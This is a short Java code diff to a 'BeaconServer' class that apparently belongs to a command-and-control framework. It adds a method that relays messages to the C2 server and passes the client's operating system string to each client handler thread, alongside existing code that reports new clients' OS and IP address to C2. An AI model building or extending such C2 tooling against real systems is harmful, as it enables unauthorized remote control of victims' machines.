@@ -216,6 +216,14 @@ public class BeaconServer implements Runnable{
         return table;
     }
 
+    /**
+     * This Function is used by the client handler to inform the C2 Server that it has lost a client
+     * @param data
+     */
+    protected void sendDataToC2Server(String data){
+        C2Handler.sendDataToC2Server(data);
+    }
+
     protected void stopServer(){
         sentinel = false; 
     }
@@ -243,7 +251,7 @@ public class BeaconServer implements Runnable{
                 C2Handler.sendDataToC2Server("New " + OSMessage + " Client at " + IPAddress);
 
                 // Create new Beacon Client Handler Thread to handle this connection between the Beacon and the client
-                BeaconClientHandler clientHandler = new BeaconClientHandler(IPAddress, duplexer, this);
+                BeaconClientHandler clientHandler = new BeaconClientHandler(IPAddress, duplexer, this, OSMessage);
                 Thread clientHandlerThread = new Thread(clientHandler);
                 clientHandlerThread.start();
 
